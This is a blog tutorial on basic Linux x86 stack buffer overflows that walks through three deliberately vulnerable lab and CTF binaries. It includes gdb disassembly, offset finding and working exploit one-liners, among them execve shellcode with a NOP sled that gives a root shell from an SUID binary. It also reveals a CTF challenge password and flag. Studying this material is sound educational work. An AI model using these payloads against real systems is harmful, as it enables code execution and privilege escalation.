---
layout: post
title:  "Stack Buffer Overflows: Linux - Chapter 1"
date:   2017-12-26 01:00:00 +0100
categories: [bof]
description: v0.1
image:
  feature: shellcode.jpg
  credit:
  creditlink:
---

Introduction
------------
Buffer overflows are probably my favourite part of the security field. They can range from simple to incomprehensible, offer a wide variety of exploitation techniques and are just kinda fun.  Also they sound way more difficult than they are!

Whilst modern OS's have started to introduce memory protections, there are always ways around these, and it's still up to the application developers to protect their applications. Have a quick search on [exploit-db](https://www.exploit-db.com) for recent buffer overflow exploits, and you'll get a fair few turn up.  To be honest, you'll probably never use any of the techniques described here to get your own zero-day.  With techniques to prevent memory exploitation such as [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection) and [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization), what's described in this post, while fundamental to learn, will not work in most modern systems.  If only I hadn't been in nappies when this stuff was 'cutting edge'.

The goal of this series is to go over the most basic of buffer overflows affecting the linux platform in an approachable manner, not shying too far from the lower level details.  Hopefully, I can help someone learn something from this.  If you have suggestions for me to improve my approach, don't hesitate to drop me a message or leave a comment, and equally if you have any questions.

The definitive article on buffer overflows is [Smashing the stack for fun and profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf) by Aleph One, and it wouldn't be right not to mention it in my opinion.  I'll also include at the end some of the resources I've used to shore up my understanding. 

So lets jump right in and smash the stack! 

### Environment  
* [Kali 2017.2](https://www.kali.org/news/kali-linux-2017-2-release/)
* [GDB Peda](https://github.com/longld/peda)
* [Ubuntu 16.04.3](http://releases.ubuntu.com/16.04/)

Example 1 - Stack buffer overflow basic 1
-----------------------------------------
I'll be using the example from [root-me](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1) to illustrate basic stack corruption.  Since this is a fairly trivial example and introductory, I hope they won't feel any issue with me posting a solution publicly.  As a point of note, you're going to need to be able to read C for most of this article, or at least follow the general logic of what's happening.
```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -m32 -o ch13 ch13.c -fno-stack-protector
*/


int main()
{

  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     system("/bin/dash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
The actual exploitation of this is fairly trivial.  The fgets function allows us to write 45 bytes of memory into a buffer of size 40.  We won't be doing anything too fancy, but it does allow us to corrupt memory and potentially some of the variables.  Firstly I'd like to take a quick moment to define some terms, namely the stack.

So what exactly is the stack?  Well, it's really just a section of memory that we define as being used to store several important variables and locals with fixed size.  Whenever I refer to the stack, just note that it's a defined block of memory where my variables defined above, like `check` and `buf` are stored.  This makes it simple for the compiler to manage variables and code, as well as allow us to do some fancy tricks if programmers get lazy.  The stack can grow and shrink as execution takes place, but this example will keep it simple. 

Let's open this in gdb and run a disassembly of the main function.  There are better tools for doing this but we'll keep it simple for now.
```gdb
gdb$ disas main
Dump of assembler code for function main:
   0x08048494 <+0>:	push   ebp
   0x08048495 <+1>:	mov    ebp,esp
   0x08048497 <+3>:	and    esp,0xfffffff0
   0x0804849a <+6>:	sub    esp,0x40
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
   0x080484c2 <+46>:	mov    eax,0x8048620
   0x080484c7 <+51>:	lea    edx,[esp+0x14]
   0x080484cb <+55>:	mov    DWORD PTR [esp+0x4],edx
   0x080484cf <+59>:	mov    DWORD PTR [esp],eax
   0x080484d2 <+62>:	call   0x8048380 <printf@plt>
   0x080484d7 <+67>:	mov    eax,0x804862c
   0x080484dc <+72>:	mov    edx,DWORD PTR [esp+0x3c]
   0x080484e0 <+76>:	mov    DWORD PTR [esp+0x4],edx
   0x080484e4 <+80>:	mov    DWORD PTR [esp],eax
   0x080484e7 <+83>:	call   0x8048380 <printf@plt>
   0x080484ec <+88>:	cmp    DWORD PTR [esp+0x3c],0x4030201
   0x080484f4 <+96>:	je     0x804850c <main+120>
   0x080484f6 <+98>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x080484fe <+106>:	je     0x804850c <main+120>
   0x08048500 <+108>:	mov    DWORD PTR [esp],0x8048638
   0x08048507 <+115>:	call   0x80483a0 <puts@plt>
   0x0804850c <+120>:	cmp    DWORD PTR [esp+0x3c],0xdeadbeef
   0x08048514 <+128>:	jne    0x804853a <main+166>
   0x08048516 <+130>:	mov    DWORD PTR [esp],0x8048654
   0x0804851d <+137>:	call   0x80483a0 <puts@plt>
   0x08048522 <+142>:	mov    DWORD PTR [esp],0x804867e
   0x08048529 <+149>:	call   0x80483b0 <system@plt>
   0x0804852e <+154>:	mov    DWORD PTR [esp],0x8048688
   0x08048535 <+161>:	call   0x80483a0 <puts@plt>
   0x0804853a <+166>:	mov    eax,0x0
   0x0804853f <+171>:	leave
   0x08048540 <+172>:	ret
End of assembler dump.
```

Wow that's a lot of letters and numbers. So lets break this down and look at the parts where the buffer, and variables are placed onto the stack.
```
   0x0804849d <+9>:	mov    DWORD PTR [esp+0x3c],0x4030201
```

Here our `check` variable is placed onto the stack at `esp+60`.  I will just convert arbitrarily between decimal and hexadecimal depending on the convenience.

```gdb
   0x080484a5 <+17>:	mov    eax,ds:0x804a020
   0x080484aa <+22>:	mov    DWORD PTR [esp+0x8],eax
   0x080484ae <+26>:	mov    DWORD PTR [esp+0x4],0x2d
   0x080484b6 <+34>:	lea    eax,[esp+0x14]
   0x080484ba <+38>:	mov    DWORD PTR [esp],eax
   0x080484bd <+41>:	call   0x8048390 <fgets@plt>
```
Here, three variables are placed onto the stack.  These will be the arguments being sent to the fgets function.  In 32-bit system's a function call takes it's arguments off the top of the stack. In this case I'll try and convert what's happening in the assembly into english step-by-step.

```gdb
mov    eax,ds:0x804a020 ; Place the value 0x804a020 into the eax register
mov    DWORD PTR [esp+0x8],eax  ; Take the value in the eax register, 0x804a020 , and place it at the memory location esp+0x8.
mov    DWORD PTR [esp+0x4],0x2d ; Take the value 0x2d, and place it at the memory location esp+0x4
lea    eax,[esp+0x14] ; Calculate the result of esp+0x14 and place it in the eax register
mov    DWORD PTR [esp],eax ; Take this result of esp+0x14 and place it at the location in memory denoted by esp.
```

So in effect we've placed at memory locations, esp, esp+0x4 and esp+0x8, three different values:
```
 -------------------
|     esp + 0x8     | <---- 0x804a020
 -------------------
|     esp + 0x4     | <---- 0x2d
 -------------------
|        esp        | <---- esp+0x14
 -------------------
```

Right after these operations take place, the `fgets` function is called.  These three values we've just placed on the stack as above are the arguments to the function `fgets` as in the C code.  This is in line with 32 bit calling conventions, arguments are placed upon the stack.  If you try some 64-bit exploitation examples, they'll actually be popped into registers (up to a point), so remember that if you find yourself unwittingly in 64-bit land.
```c
fgets(buf,45,stdin);
```

So `0x804a020` is the location of the stdin handle, `0x2d` is just 45 and `esp+0x14` will be where our buffer is located on the stack.

We've established earlier that our check variable is located at `esp+60` and since our buffer is at `esp+20`, if we place 44 bytes into fgets, the first 40 will fill the buffer, whilst the next 4 will overwrite the check variable.  Lets test this out quickly.  We'll use the following code to generate a file:
```bash
python -c 'print "A"*44'`> /tmp/overflow
```

We then pipe this through gdb into our program and we get:
```gdb
gdb$ run < /tmp/overflow
Starting program: /challenge/app-systeme/ch13/ch13 < /tmp/overflow

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x41414141

You are on the right way!
[Inferior 1 (process 27133) exited normally]
--------------------------------------------------------------------------[regs]
  EAX:Error while running hook_stop:
No registers.
gdb$
```

So, we overwrote the check variable with our buffer, as 0x41 is the hex code for ascii 'A' so `0x41414141` is equivalent to `AAAA`.   To get our shell spawned, we need to overwrite our variable with `0xdeadbeef`, so we just write a file containing `A*40` followed by the bytes for `0xdeadbeef`.  Code of the following form achieves this:

```python
import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)
```
We run this and pipe it into our binary, and while we get a shell it isn't returned to us as interactive.
```bash
app-systeme-ch13@challenge02:~$ python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef);' | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
Shell closed! Bye.
```
We'll just pipe in another command to cat the .passwd file and we're returned with our password which is read by the dash command.

```bash
app-systeme-ch13@challenge02:~$ (python -c 'import struct;  print "A"*40 + struct.pack("<L", 0xdeadbeef)';echo cat .passwd) | ./ch13

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ 
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
1w4ntm0r3pr0np1s
Shell closed! Bye.
```

So to summarise, using our understanding of the stack we've effectively corrupted and overwritten a stack variable via an overflow.

The stack
----------
<p align="center">
<img src='/assets/img/stack-bof-1/stack-1.png'>
 </p>

So I've mentioned the stack a lot, but how do we know where it's located and how does it relate to `esp` which we kept referring to?  The diagram above illustrates generally how it looks in memory.  Of course a lot of details are missing but it does show the basics.

We define where the top of the stack is located in memory at any specific time with the `esp` register.  It defines the location of the top of the stack, and is manipulated with individual `push` and `pop` instructions, which as their names might indicate, either add or remove from the stack.  The stack itself will grow downwards in memory for x86 architectures.  Therefore, if we push to the stack a value, that value is written to the location at `esp` and the value of `esp` is decremented, and incremented for popping from it.  The diagram below illustrates what happens to ESP as we push and pop. Just as a note, an instruction of the form `pop ebx` means that the value popped off the stack is moved into the `ebx` register.

<p align="center">
<img src='/assets/img/stack-bof-1/stack-2.png'>
 </p>

On the other end we have the frame pointer, `ebp`, which defines where the function parameters and local variables reside.  It was included so that these variables had a fixed offset they could be referred to from.  As `esp` moves, it cannot be used in such a way, whereas `ebp` in a given stack frame is generally stationary.  [This resource](https://practicalmalwareanalysis.com/2012/04/03/all-about-ebp/) provides a good overview of the `ebp` register.

The third register we will refer to is `eip`.  In simple terms it just stores the location of the next instruction that is to be executed.  If you want a more solid foundation of each of these registers, then [skullsecurity's article](https://wiki.skullsecurity.org/index.php?title=Registers) is quite a good one.

At `ebp+4` the return address of the stack frame is stored.  What is this and why is it important?

### The Return Address  
When a stack frame is left, such as in a function exit, generally the `leave` instruction is called.  This clears up the stack frame by moving the stack pointer to the frame pointer, in effect popping the stack up to the frame pointer.  No data is actually deleted but from the point-of-view of the stack, it no longer exists unless we go manually adjusting `esp`.

```asm
mov esp, ebp
pop ebp
```

<p align="center">
<img src='/assets/img/stack-bof-1/stack-3.png'>
 </p>

The saved address of the last frame pointer is then popped off the stack.  This because the frame pointer also stores details on the area of memory that called it, including the last frame pointer at `ebp` and the next instruction to be executed at `ebp+4`.  This is important as the next instruction to be called is a `ret`, which will pop the return address off the stack and moved into `eip`. Since `eip` refers to the next instruction to be executed, execution then jumps to that value. 

Below isn't how it actually works but will illustrate it hopefully.

```asm
pop ebx
jmp ebx
```
If you're interested in a more detailed exploration of how the stack works, Gustavo Duarte's [Journey to the Stack](http://duartes.org/gustavo/blog/post/journey-to-the-stack/) is a great read.

Hopefully, now we can see how we can hijack command of a program's execution rather than just overwriting variables, with this technique.  If we can overwrite enough past our buffer, we can overwrite the saved return address.  Once a `ret` is called, the address we've overwritten will be jumped to.  So how do we use this?

Example 2 - ret2win
-----------------
We'll be using the first binary challenge on [ropemporium](https://ropemporium.com/challenge/ret2win.html), called ret2win for this.  For this we're going to be hijacking execution of the program.

When an unreachable address is jumped to for execution, the program will exit in a segmentation fault.  If we want to execute an arbitrary command, all we have to do is force a segmentation fault to prove that we've overwritten the saved return address.  So lets load up the binary and input some text.

```bash
root@kali:~/Downloads# python -c 'print "A"*200' | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Segmentation fault
```

Boom!  We got a segmentation fault, but it doesn't give us much of a clue how many bytes we'll need to overwrite.  We can either modify the amount we overwrite byte by byte, or use a cyclic sequence to read off the location of EIP.  Metasploit has it's `pattern_create.rb` and [PEDA](https://github.com/longld/peda) has it's own `pattern create`.

We'll create a buffer of length 200, and see the value that `eip` segfaults on.

```gdb
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /root/Downloads/ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
```

The program will then print out it's registers, but the one of most importance is the EIP register.
```bash
EAX: 0xffffd290 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EBX: 0x0 
ECX: 0xf7faf87c --> 0x0 
EDX: 0xffffd290 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
ESI: 0x1 
EDI: 0xf7fae000 --> 0x1b2db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd2c0 --> 0xf7fa0062 --> 0xe0a5210 
EIP: 0x41414641 ('AFAA')
```

Here we see it has a value of `0x41414641`.  What's happened in execution is we've overwritten the saved EIP, and then the program has attempted to return back to that location in memory.  Since there's nothing there, it's thrown a segmentation fault.  we use `pattern offset 0x41414641` in PEDA, which tells us at what position that value was in our string.

```
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

Here we see it's at position 44.  So we want to write 44 bytes, and then write our return address into our input.

So we know from the description that we want to return into the ret2win function.  We'll have a quick look at the disassembly of this function to see what it's doing.

```gdb
;-- ret2win:
0x08048659      55             push ebp
0x0804865a      89e5           mov ebp, esp
0x0804865c      83ec08         sub esp, 8
0x0804865f      83ec0c         sub esp, 0xc
0x08048662      6824880408     push str.Thank_you__Here_s_your_flag: ; 0x8048824 ; "Thank you! Here's your flag:"
0x08048667      e894fdffff     call sym.imp.printf
0x0804866c      83c410         add esp, 0x10
0x0804866f      83ec0c         sub esp, 0xc
0x08048672      6841880408     push str.bin_cat_flag.txt   ; 0x8048841 ; "/bin/cat flag.txt"
0x08048677      e8b4fdffff     call sym.imp.system
0x0804867c      83c410         add esp, 0x10
0x0804867f      90             nop
0x08048680      c9             leave
0x08048681      c3             ret
```

It prints out the value of the flag we want.  Obviously, this is a controlled example but it does show how we can redirect into an alternative function.

By looking at the disassembly, we already know what location we want to return to (It's the location in memory we've disassembled, so 0x08048659), so now we just need to construct our payload, and send it into the program.  In this case we just overwrite EIP with the location of that function.

```bash
root@kali:~/Desktop# python -c 'print "A"*44 + "\x59\x86\x04\x08"'|./ret2win32
For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer; 
What could possibly go wrong? 
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets! 
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!} 
Segmentation fault 
```

So with this we've succesfully redirected execution into a function of our choice. We did get a segmentation fault at the end, but this is avoidable if required, as we didn't control execution once our `ret2win` function had exited.  For now, we won't worry about that.

Custom code execution
--------------------
Now we've succesfully redirected execution, lets look at executing some code of our own, instead of calling another function.  This will be the technique most tutorials will begin with, jumping back into the buffer and executing some shellcode we place in there.  Here I'll show the theory of this and then move into another example.

So we've found a vulnerable program allowing us to perform a buffer overflow, but the program itself is running on a remote system and we want to send back a reverse shell to give us code execution.  There's plenty of shellcode out there allowing us to that, but how do we actually execute it?

* [https://www.exploit-db.com/exploits/40110/](https://www.exploit-db.com/exploits/40110/)
* [https://www.exploit-db.com/exploits/42485/](https://www.exploit-db.com/exploits/42485/)
* [https://www.exploit-db.com/exploits/42339/](https://www.exploit-db.com/exploits/42339/)

I'm sure you've already guessed this part!  If not, in the last part we wrote into the buffer  data of the form `JUNK+EIP`, where EIP is the value we intended to overwrite `eip` with.  However, why don't we just place some malicious code in place of that junk data, and then set `eip` to jump back and execute it?

One other advantage of this method is that we don't need to know the exact address to jump back to, making exploit development quite a bit easier.  This is because we can leverage the `NOP` instruction, `\x90`.  This literally does nothing, but if we write a sequence of NOP's before our shellcode, also known as a nopsled, we can set `eip` to any address in that sequence.  

Our exploit format then becomes `NOPSLED+SHELLCODE+EIP`.  Do note that there's nothing stopping you doing `JUNK+EIP+NOPSLED+SHELLCODE` either.  It just depends how much space you have in your stack frame, what protections are in place and how you're jumping to your shellcode but we'll get into that at a later date.  Just know for now that I'm only explaining one method, which is a hardcoded address.

So let's see this in action!

Example 3 - Jumping to Shellcode
------------

For this we'll use the following C program example.  This will make our job much easier as it will print out the location of the buffer in memory, removing the need for diving too deep into GDB internals for now.  It also makes our job easier as memory locations will be different within and outside of GDB.  The environment I will be using for this will be Ubuntu 64-bit 16.04.3

```c
#include <stdio.h>

int main(){
	bof();
	return 0;
}

int bof()
{
	char buffer[128];
	printf("Wanna Smash!?: %p\n", (void*)&buffer);
	gets(buffer);
	return 0;
}

```
We want to disable ASLR and also compile this file without stack protections.  This also compiles it to 32-bit as the process is very slightly different if dealing with a 64-bit binary.

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gcc test.c -o test  -fno-stack-protector -z execstack -m32
```

Running the file reveals the 
```bash
ubuntu@ubuntu:/tmp$ ./test
Wanna Smash!?: 0xffffcfd0
```

We create a pattern and input it into the binary, and as we see below we succeeded in overwriting EIP.  
```gdb
EAX: 0x0 
EBX: 0x0 
ECX: 0xf7fb85a0 --> 0xfbad2288 
EDX: 0xf7fb987c --> 0x0 
ESI: 0xf7fb8000 --> 0x1afdb0 
EDI: 0xf7fb8000 --> 0x1afdb0 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd030 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
```

```
gdb-peda$ pattern offset 0x41416d41
1094806849 found at offset: 140
```
We see it's at position 140.  Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root.  We then use the binary to get the position of the buffer.
```bash
ubuntu@ubuntu:/tmp$ sudo chown root:root ./test
[sudo] password for ubuntu: 
ubuntu@ubuntu:/tmp$ sudo chmod u+s ./test
ubuntu@ubuntu:/tmp$ ./test
Wanna Smash!?: 0xffffcfd0
```

In our payload we then place the following shellcode to return us a shell: [http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)
```python
python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffcfd0)"  > /tmp/var
```

You'll notice here I've used `ljust` on the shellcode.  This just pads the string to the determined length of 140 with `NOP` instructions.  This makes the process of creating a nopsled slightly easier.  For example, if we were to replace the shellcode, we would just replace the string and the payload would still be of length 140.  

We run the binary, inputting the payload, and we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) or the euid does to 0, meaning we now have root privileges.

```bash
ubuntu@ubuntu:/tmp$ (cat /tmp/var; cat) | ./test
Wanna Smash!?: 0xffffcfd0
id
uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```


Epilogue
--------
We've gone from overwriting basic stack variables to controlling complete execution of the program.  Next I'll be showing you how to use GDB to determine the location to jump to, and how to bypass the very basic memory protections.  Have fun exploiting, and if you have any questions, do drop me a message.  For now I've included all references and other literature that might be of interest.  

Happy Hacking!

References
----------
[PEDA](https://github.com/longld/peda)  
[Ropemporium](https://ropemporium.com/challenge/ret2win.html)  
[SkullSecurity - Registers](https://wiki.skullsecurity.org/index.php?title=Registers)  
[EBP Register](https://practicalmalwareanalysis.com/2012/04/03/all-about-ebp/)  
[Smashing the Stack for Fun and Profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)  
[Journey to the Stack](http://duartes.org/gustavo/blog/post/journey-to-the-stack/)  
[RopEmporium - ret2win](https://ropemporium.com/challenge/ret2win.html)  
[ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1)  
[Difference between Real User ID, Effective User ID and Saved User ID](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id)  
[http://shell-storm.org/shellcode/files/shellcode-606.php](http://shell-storm.org/shellcode/files/shellcode-606.php)

Other Literature
---------------
[64 Bit Linux Stack Smashing](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/)  
[Sploitfun Tutorials](https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/)  
[Jumping to shellcode](http://www.abatchy.com/2017/05/jumping-to-shellcode.html)  
[Corelan - Windows Buffer Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)


Changelog
---------
